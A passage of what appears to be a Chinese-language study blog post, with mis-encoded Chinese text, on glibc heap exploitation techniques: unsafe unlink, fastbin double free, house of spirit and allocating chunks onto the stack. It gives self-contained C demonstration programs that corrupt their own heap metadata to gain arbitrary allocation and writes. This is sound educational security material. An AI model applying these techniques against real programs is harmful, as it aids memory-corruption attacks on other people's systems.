src="/2024/07/15/heap-study/unsafe_unlink_3.png"><br>æ»¡è¶³(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</p><p>æ­¤æ—¶å‡è®¾èƒ½å®ç°å †æº¢å‡ºå°±å¯ä»¥ä¿®æ”¹chunk1çš„å…ƒæ•°æ®<br>æ¥ä½¿freeè®¤ä¸ºchunk0ä¸ºfreeï¼Œä»¥ä¾¿free(chunk1)åè§¦å‘unlink<br>æ­¤æ—¶chunk_ptræŒ‡å‘chunk_ptr - 0x18  </p><p><img src="/2024/07/15/heap-study/unsafe_unlink_4.png">  </p><h1 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin_attack"></a>fastbin_attack</h1><h2 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin_double_free"></a>fastbin_double_free</h2><p>Fastbin Double Free èƒ½å¤ŸæˆåŠŸåˆ©ç”¨ä¸»è¦æœ‰ä¸¤éƒ¨åˆ†çš„åŸå› </p><ol><li>fastbin çš„å †å—è¢«é‡Šæ”¾å next_chunk çš„ pre_inuse ä½ä¸ä¼šè¢«æ¸…ç©º</li><li>fastbin åœ¨æ‰§è¡Œ free çš„æ—¶å€™ä»…éªŒè¯äº† main_arena ç›´æ¥æŒ‡å‘çš„å—ï¼Œå³é“¾è¡¨æŒ‡é’ˆå¤´éƒ¨çš„å—ã€‚å¯¹äºé“¾è¡¨åé¢çš„å—ï¼Œå¹¶æ²¡æœ‰è¿›è¡ŒéªŒè¯ã€‚</li></ol><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„æ¼”ç¤º  </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> pre_size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> fd;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> bk;</span><br><span class="line">} CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line">CHUNK bss_chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    <span class="type">void</span> *chunk_a,*chunk_b;</span><br><span class="line"></span><br><span class="line">    bss_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)chunk_a=&amp;bss_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p"</span>,chunk_b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>å…ˆè¿›è¡Œä¸¤æ¬¡ç”³è¯·</p><p><img src="/2024/07/15/heap-study/fastbin_double_free_1.png"></p><p>åœ¨è¿›è¡Œä¸‰æ¬¡é‡Šæ”¾æ­¤æ—¶</p><p><img src="/2024/07/15/heap-study/fastbin_double_free_2.png"></p><p>å¯ä»¥çœ‹åˆ°å°¾éƒ¨çš„chunk1æŒ‡å‘chunk2</p><p>ä¿®æ”¹åå¯ä»¥çœ‹åˆ°</p><p><img src="/2024/07/15/heap-study/fastbin_double_free_3.png"></p><h2 id="house-of-spirit-glibc2-31"><a href="#house-of-spirit-glibc2-31" class="headerlink" title="house_of_spirit(glibc2.31)"></a>house_of_spirit(glibc2.31)</h2><figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">house-of-spirit æ˜¯ä¸€ç§é€šè¿‡å †çš„ fast bin æœºåˆ¶æ¥è¾…åŠ©æ ˆæº¢å‡ºçš„æ–¹æ³•</span><br><span class="line">å¦‚æœæ ˆæº¢å‡ºçš„æ—¶å€™æº¢å‡ºçš„é•¿åº¦ä¸èƒ½è¦†ç›–æ‰è¿”å›åœ°å€çš„ä½†æ˜¯å´å¯ä»¥è¦†ç›–æ ˆä¸Šé¢ä¸€ä¸ªå³å°† free çš„æŒ‡é’ˆçš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ªæŒ‡é’ˆè¦†ç›–ä¸ºæ ˆä¸Šçš„æŸä¸€ä¸ªåœ°å€ï¼Œå¹¶ä¸”æŠŠè¿™ä¸ªåœ°å€ä¸Šä¼ªé€ ä¸€ä¸ª chunkï¼Œfree ä¹‹åå†æ¬¡ malloc å°±å¯ä»¥ç”³è¯·åˆ°æ ˆä¸Šé¢ä¼ªé€ çš„é‚£ä¸€å—ï¼Œè¿™æ—¶å€™å°±æœ‰å¯èƒ½æ”¹å†™è¿”å›åœ°å€äº†</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"This file demonstrates the house of spirit attack."</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"æœ¬æ–‡ä»¶æ¼”ç¤ºäº† house of spirit æ”»å‡»ã€‚"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"This attack adds a non-heap pointer into fastbin, thus leading to (nearly) arbitrary write."</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"è¿™ç§æ”»å‡»å°†ä¸€ä¸ªéå †æŒ‡é’ˆæ·»åŠ åˆ° fastbinï¼Œä»è€Œå¯¼è‡´ï¼ˆå‡ ä¹ï¼‰ä»»æ„å†™å…¥ã€‚"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Required primitives: known target address, ability to set up the start/end of the target memory"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"æ‰€éœ€çš„åŸºæœ¬æ“ä½œï¼šå·²çŸ¥çš„ç›®æ ‡åœ°å€ï¼Œèƒ½å¤Ÿè®¾ç½®ç›®æ ‡å†…å­˜çš„èµ·å§‹/ç»“æŸ"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\nStep 1: Allocate 7 chunks and free them to fill up tcache"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\næ­¥éª¤ 1ï¼šåˆ†é… 7 ä¸ªå †å—å¹¶é‡Šæ”¾å®ƒä»¬ä»¥å¡«æ»¡ tcache"</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *chunks[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) {</span><br><span class="line">chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) {</span><br><span class="line"><span class="built_in">free</span>(chunks[i]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\nStep 2: Prepare the fake chunk"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\næ­¥éª¤ 2ï¼šå‡†å¤‡ä¼ªé€ çš„å †å—"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line"><span class="comment">// è¿™ä¸ fastbinsY æ— å…³ï¼ˆä¸è¦è¢« 10 è¿·æƒ‘ï¼‰- fake_chunks åªæ˜¯ç”¨äºåˆ†é…çš„å†…å­˜ï¼ˆç”± fastbinsY æŒ‡å‘ï¼‰</span></span><br><span class="line"><span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">0x10</span>)));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The target fake chunk is at %p\n"</span>, fake_chunks);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ç›®æ ‡ä¼ªé€ å †å—ä½äº %p\n"</span>, fake_chunks);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"It contains two chunks. The first starts at %p and the second at %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"å®ƒåŒ…å«ä¸¤ä¸ªå †å—ã€‚ç¬¬ä¸€ä¸ªä» %p å¼€å§‹ï¼Œç¬¬äºŒä¸ªä» %p å¼€å§‹ã€‚\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"è¯¥åŒºåŸŸçš„ chunk.size å¿…é¡»æ¯”è¯¥åŒºåŸŸå¤§ 16ï¼ˆä»¥å®¹çº³å †å—æ•°æ®ï¼‰ï¼ŒåŒæ—¶ä»å±äº fastbin ç±»åˆ«ï¼ˆx64 ä¸Š &lt;= 128ï¼‰ã€‚å¯¹äº fastbin å¤§å°çš„å †å—ï¼Œfree ä¼šå¿½ç•¥ PREV_INUSEï¼ˆæœ€ä½ä½ï¼‰ä½ï¼Œä½† IS_MMAPPEDï¼ˆç¬¬äºŒæœ€ä½ä½ï¼‰å’Œ NON_MAIN_ARENAï¼ˆç¬¬ä¸‰æœ€ä½ä½ï¼‰ä½ä¼šå¼•èµ·é—®é¢˜ã€‚\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end."</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"... è¯·æ³¨æ„ï¼Œè¿™å¿…é¡»æ˜¯ä¸‹ä¸€ä¸ª malloc è¯·æ±‚çš„å¤§å°ï¼Œå¹¶å››èˆäº”å…¥åˆ° malloc å®ç°ä½¿ç”¨çš„å†…éƒ¨å¤§å°ã€‚ä¾‹å¦‚ï¼Œåœ¨ x64 ä¸Šï¼Œ0x30-0x38 éƒ½ä¼šå››èˆäº”å…¥åˆ° 0x40ï¼Œå› æ­¤å®ƒä»¬é€‚ç”¨äºæœ€åçš„ malloc å‚æ•°ã€‚"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now set the size of the chunk (%p) to 0x40 so malloc will think it is a valid chunk.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ç°åœ¨å°†å †å—çš„å¤§å°ï¼ˆ%pï¼‰è®¾ç½®ä¸º 0x40ï¼Œä»¥ä¾¿ malloc è®¤ä¸ºå®ƒæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„å †å—ã€‚\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size // è¿™æ˜¯å¤§å°</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ä¸‹ä¸€ä¸ªä¼ªé€ åŒºåŸŸçš„ chunk.size å¿…é¡»åˆç†ã€‚å³ &gt; 2*SIZE_SZï¼ˆx64 ä¸Š &gt; 16ï¼‰&amp;&amp; &lt; av-&gt;system_memï¼ˆä¸»åŒºåŸŸé»˜è®¤ &lt; 128kbï¼‰ä»¥é€šè¿‡ nextsize å®Œæ•´æ€§æ£€æŸ¥ã€‚æ— éœ€ fastbin å¤§å°ã€‚\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Set the size of the chunk (%p) to 0x1234 so freeing the first chunk can succeed.\n"</span>, &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"å°†å †å—çš„å¤§å°ï¼ˆ%pï¼‰è®¾ç½®ä¸º 0x1234ï¼Œä»¥ä¾¿é‡Šæ”¾ç¬¬ä¸€ä¸ªå †å—å¯ä»¥æˆåŠŸã€‚\n"</span>, &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize // ä¸‹ä¸€ä¸ªå¤§å°</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\nStep 3: Free the first fake chunk"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\næ­¥éª¤ 3ï¼šé‡Šæ”¾ç¬¬ä¸€ä¸ªä¼ªé€ å †å—"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Note that the address of the fake chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"è¯·æ³¨æ„ï¼Œä¼ªé€ å †å—çš„åœ°å€å¿…é¡»æ˜¯ 16 å­—èŠ‚å¯¹é½çš„ã€‚\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *victim = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\nStep 4: Take out the fake chunk"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\næ­¥éª¤ 4ï¼šå–å‡ºä¼ªé€ å †å—"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the next calloc will return our fake chunk at %p!\n"</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ç°åœ¨ä¸‹ä¸€ä¸ª calloc å°†è¿”å›æˆ‘ä»¬çš„ä¼ªé€ å †å—åœ¨ %pï¼\n"</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc can do the trick as well, you just need to do it for 8 times."</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc ä¹Ÿå¯ä»¥è¾¾åˆ°ç›®çš„ï¼Œä½ åªéœ€è¦åš 8 æ¬¡ã€‚\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *allocated = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(0x30): %p, fake chunk: %p\n"</span>, allocated, victim);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(0x30)ï¼š%pï¼Œä¼ªé€ å †å—ï¼š%p\n"</span>, allocated, victim);</span><br><span class="line"></span><br><span class="line">assert(allocated == victim);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>æ ˆä¸Šè¿˜æœªè¿›è¡Œæ„é€ çš„fake_chunks<br><img src="/2024/07/15/heap-study/house_of_spirit_1.png"><br>æˆ‘ä»¬å°†è¦å°†fake_chunksè¿›è¡Œä»¥ä¸‹æ„é€ è€Œç»•è¿‡glibcçš„æ£€æŸ¥<br><img src="/2024/07/15/heap-study/house_of_spirit_2.png"><br>ä¸‹é¢æ˜¯æ„é€ åçš„fake_chunks<br><img src="/2024/07/15/heap-study/house_of_spirit_3.png"><br><img src="/2024/07/15/heap-study/house_of_spirit_4.png">  </p><p>æ„é€  chunk çš„æ—¶å€™è¦æ³¨æ„ç»•è¿‡ä¸€äº›æ£€æŸ¥ï¼š</p><p>åé¢é‚£ä¸‰ä¸ªç‰¹æ®Šçš„æ ‡å¿—ä½å‰ä¸¤ä¸ªå¿…é¡»éƒ½ä¸º 0ï¼Œæ„é€  size çš„æ—¶å€™ç›´æ¥ 0x*0å°±å¯ä»¥äº†ï¼Œç„¶åå¤§å°è¦æ³¨æ„ç¬¦åˆ fastbin çš„å¤§å°ï¼Œnext chunk çš„å¤§å°ä¹Ÿè¦æ³¨æ„ï¼Œå¿…é¡»å¤§äº 2*SIZE_SZï¼Œå°äº av-&gt;system_mem.64ä½ä¸‹ï¼š16&lt; next chunk çš„ size &lt; 128kbã€‚</p><h2 id="fastbin-dup-into-stack-Alloc-to-Stack"><a href="#fastbin-dup-into-stack-Alloc-to-Stack" class="headerlink" title="fastbin_dup_into_stack(Alloc to Stack)"></a>fastbin_dup_into_stack(Alloc to Stack)</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">               <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">        <span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">        <span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">        <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line">                <span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line">                <span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line">                <span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line">                <span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">        stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">        *d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>åœ¨UAFçš„åŸºç¡€ä¸Šï¼Œä¿®æ”¹chunk1çš„fdæŒ‡é’ˆæŒ‡å‘stack_varå‰çš„0x20çš„ä½ç½®</p><p><img src="/2024/07/15/heap-study/fastbin_dup_into_stack_1.png"></p><p><img src="/2024/07/15/heap-study/fastbin_dup_into_stack_2.png"></p><p>æ­¤æ—¶main_arenaæŒ‡å‘äº†æ ˆä¸Šï¼Œå†mallocä¸€æ¬¡å°±åˆ†é…åˆ°äº†æ ˆä¸Š</p><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><blockquote><p>Arbitrary Alloc å…¶å®ä¸ Alloc to stack æ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯åˆ†é…çš„ç›®æ ‡ä¸å†æ˜¯æ ˆä¸­ã€‚ äº‹å®ä¸Šåªè¦æ»¡è¶³ç›®æ ‡åœ°å€å­˜åœ¨åˆæ³•çš„ size åŸŸï¼ˆè¿™ä¸ª size åŸŸæ˜¯æ„é€ çš„ï¼Œè¿˜æ˜¯è‡ªç„¶å­˜åœ¨çš„éƒ½æ— å¦¨ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ chunk åˆ†é…åˆ°ä»»æ„çš„å¯å†™å†…å­˜ä¸­ï¼Œæ¯”å¦‚ bssã€heapã€dataã€stack ç­‰ç­‰ã€‚</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span 